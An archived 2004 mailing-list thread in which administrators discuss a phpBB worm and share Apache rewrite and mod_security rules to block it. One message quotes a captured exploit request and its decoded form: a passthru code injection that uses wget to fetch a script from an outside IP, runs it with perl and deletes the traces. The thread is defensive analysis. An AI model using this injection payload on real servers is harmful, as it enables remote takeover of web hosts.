<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<html>
<head>
<link href="../list/browse.css" rel="stylesheet" type="text/css">
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="list.cgi%3Flist=fosug&amp;cmd=feed&amp;feedtype=rss2" />
<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="list.cgi%3Flist=fosug&amp;cmd=feed&amp;feedtype=atom" />
<title>fosug: Thread: Re: phpBB Worm [Scanned]</title>
<meta NAME="robots" CONTENT="noindex">
<meta NAME="robots" CONTENT="nofollow">
<base href="">
</head>
<body class=showthread-body>
<div class=menubar>
<a class="menu-lists" href="list.cgi.html">[Lists]</a>
<a class="menu-config" href="list.cgi%3Flist=fosug&amp;cmd=configure.html">[Configure]</a>
<a class="menu-first" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200410.html">[<<]</a>
<a class="menu-prev" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200411.html">[<]</a>
<a class="menu-bythread" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200412.html">[by Thread]</a>
<a class="menu-bydate" href="list.cgi%3Flist=fosug&amp;cmd=monthbydate&amp;month=200412.html">[by Date]</a>
<a class="menu-next" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200501.html">[>]</a>
<a class="menu-last" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200607.html">[>>]</a>
<a class="menu-months" href="list.cgi%3Flist=fosug&amp;cmd=months.html">[Months]</a>
<a class="menu-search" href="list.cgi%3Flist=fosug&amp;cmd=search.html">[Search]</a>
<a class="menu-subscribe" href="mailto:fosug-subscribe@fosug.org?subject=Just click SEND">[eSubscribe]</a>
<a class="feed-link" href="list.cgi%3Flist=fosug&amp;cmd=feed">[Feed]</a>
</div>
<hr>
<div class=showthread-title><h1>fosug: Thread: Re: phpBB Worm [Scanned]</h1></div>
<hr>
<table class=msgs><tr><td colspan=99 class=pager>
<span class="pager-first">[<<]</span>
<span class="pager-prev">[<]</span>
<span class="pager-curr">Page 1 of 1</span>
<span class="pager-next">[>]</span>
<span class="pager-last">[>>]</span>
</td></tr><tr><td class=msgsitem><b>Subject:</b>
<a href="mailto:fosug@fosug.org?subject=Re: Re: phpBB Worm [Scanned]">Re: phpBB Worm [Scanned]</a>
<br><b>From:</b>
<a class="author" href="list.cgi%3Flist=fosug&amp;cmd=author&amp;authorid=dbfcabnmmpgfbdibogec&amp;month=200412.html">Michael Cederquist ####@####.####</a>
<br><b>Date:</b>
22 Dec 2004 19:12:23 -0000
<br><b>Message-Id:</b> &lt;1103742856.7183.6.camel@home.gentoo&gt;
<br>
<hr><pre> It Is a nasty Little Worm ....
On Wed, 2004-12-22 at 10:30 -0800, Stevo wrote:
&gt; This is interesting... I've been following this worm for a while.
&gt; Notice what it decodes too? It's pretty interesting. They send a
&gt; request to a vulnerable web server that downloads a program, and runs
&gt; perl to execute the contents and own the box, then it defaces the
&gt; page. Hehe... I checked the fosug server, it's running phpbb but the
&gt; php  version is not vulnerable.
&gt; 
&gt; Interesting stuff isn't it?
&gt; 
&gt; cheers,
&gt; 
&gt; Stevo
&gt; 
&gt; ---------- Forwarded message ----------
&gt; From: Sebastian Wiesinger ####@####.####
&gt; Date: Wed, 22 Dec 2004 12:22:15 +0100
&gt; Subject: Re: phpBB Worm
&gt; To: ####@####.####
&gt; 
&gt; 
&gt; * Raymond Dijkxhoorn ####@####.#### [2004-12-22 00:06]:
&gt; &gt; If you cannot fix it (virtual servers) fast for all your clients you could
&gt; &gt; also try with something like this:
&gt; &gt;
&gt; &gt;         RewriteEngine On
&gt; &gt;         RewriteCond %{QUERY_STRING} ^(.*)echr(.*) [OR]
&gt; &gt;         RewriteCond %{QUERY_STRING} ^(.*)esystem(.*)
&gt; &gt;         RewriteRule ^.*$                                -               [F]
&gt; &gt;
&gt; &gt; We had some vhosts where this worked just fine. On our systems we didnt
&gt; &gt; see any valid request with echr and esystem, just be gentle with it, it
&gt; &gt; works for me, it could work for you ;)
&gt; 
&gt; If you use mod_security, this may help, too:
&gt; 
&gt; SecFilterSelective &quot;THE_REQUEST&quot;
&gt; &quot;(system|exec|passthru|popen|shell_exec|proc_open|fopen|fwrite)\s*\(&quot;
&gt; 
&gt; I had another exploit attempt, with this payload:
&gt; 
&gt; 66.119.13.4 - - [22/Dec/2004:10:06:47 +0100] &quot;GET
&gt; /forum/viewtopic.php?t=%37&amp;rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20%63%64%20%2F%74%6D%70%3B%77%67%65%74%20%31%32%38%2E%31%37%34%2E%31%33%37%2E%32%33%30%2F%62%6E%20%2D%4F%20%2E%62%3B%20%70%65%72%6C%20%2D%70%65%20%79%2F%74%68%6D%76%64%77%30%39%38%37%36%35%34%33%32%31%75%6F%69%65%61%2F%61%65%69%6F%75%31%32%33%34%35%36%37%38%39%30%77%64%76%74%68%6D%2F%20%2E%62%7C%20%70%65%72%6C%3B%20%72%6D%20%2D%66%20%2E%62%20%2A%2E%70%6C%20%62%30%74%2A%3B%20%65%63%68%6F%20%5F%45%4E%44%5F&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527
&gt; HTTP/1.1&quot; 200 12266 &quot;-&quot; &quot;-&quot;
&gt; 
&gt; Which decodes to:
&gt; 
&gt; rush=echo _START_; cd /tmp;wget 128.174.137.230/bn -O .b; perl -pe
&gt; y/thmvdw0987654321uoiea/aeiou1234567890wdvthm/ .b| perl; rm -f .b *.pl
&gt; b0t*; echo _END_
&gt; highlight='.passthru($HTTP_GET_VARS[rush]).'
&gt; 
&gt; Regards,
&gt; 
&gt; Sebastian
&gt; 
&gt; --
&gt; GPG Key-ID: 0x76B79F20 (0x1B6034F476B79F20)
&gt; Wehret den Anfaengen: <a href="http://odem.org/informationsfreiheit/">http://odem.org/informationsfreiheit/</a>
&gt; Thunder rolled. ... It rolled a six.
&gt;   --Terry Pratchett, Guards! Guards!
-- 
Michael Cederquist ####@####.####

</pre>

<tr><td colspan=99 class=pager>
<span class="pager-first">[<<]</span>
<span class="pager-prev">[<]</span>
<span class="pager-curr">Page 1 of 1</span>
<span class="pager-next">[>]</span>
<span class="pager-last">[>>]</span>
</td></tr></table><hr><div class=menubar>
<a class="menu-lists" href="list.cgi.html">[Lists]</a>
<a class="menu-config" href="list.cgi%3Flist=fosug&amp;cmd=configure.html">[Configure]</a>
<a class="menu-first" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200410.html">[<<]</a>
<a class="menu-prev" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200411.html">[<]</a>
<a class="menu-bythread" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200412.html">[by Thread]</a>
<a class="menu-bydate" href="list.cgi%3Flist=fosug&amp;cmd=monthbydate&amp;month=200412.html">[by Date]</a>
<a class="menu-next" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200501.html">[>]</a>
<a class="menu-last" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200607.html">[>>]</a>
<a class="menu-months" href="list.cgi%3Flist=fosug&amp;cmd=months.html">[Months]</a>
<a class="menu-search" href="list.cgi%3Flist=fosug&amp;cmd=search.html">[Search]</a>
<a class="menu-subscribe" href="mailto:fosug-subscribe@fosug.org?subject=Just click SEND">[eSubscribe]</a>
<a class="feed-link" href="list.cgi%3Flist=fosug&amp;cmd=feed">[Feed]</a>
</div>

<hr>
<div class=versioninfo>
Powered by
<a href="http://untroubled.org/ezmlm-browse/">ezmlm-browse 0.10</a>.
</div>
</body>
</html>
